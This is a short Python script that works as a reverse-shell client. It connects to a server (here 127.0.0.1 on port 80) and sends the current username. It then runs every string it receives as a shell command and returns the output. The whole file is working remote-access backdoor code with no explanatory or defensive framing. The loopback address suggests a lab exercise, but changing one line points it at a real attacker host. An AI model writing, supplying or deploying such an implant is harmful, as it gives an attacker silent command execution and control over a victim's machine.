import socket
import subprocess
import sys
import getpass

def create_socket():
    try:
        global s
        s = socket.socket()
    except socket.error:
        sys.exit()

def connect_to_server():
    try:
        global s
        host = '127.0.0.1'
        port = 80
        s.connect((host, port))
        username = getpass.getuser()
        s.send(username.encode())
    except socket.error:
        sys.exit()

def receive_commands():
    while True:
        try:
            data = s.recv(1024)
            if not data:
                break            
            if data.decode("utf-8") in ["EXIT", "q", "e", "quit"]:
                break
            command = data.decode("utf-8")
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output_bytes, error_bytes = cmd.communicate()
            output_str = output_bytes.decode("utf-8") + error_bytes.decode("utf-8")            
            if output_str:
                s.send(output_str.encode())
            else:
                s.send(b"No output. The command may have opened an application.")
        except Exception as e:
            s.send(f"Error: {str(e)}".encode())
            break
    s.close()

def main():
    create_socket()
    connect_to_server()
    receive_commands()

if __name__ == "__main__":
    main()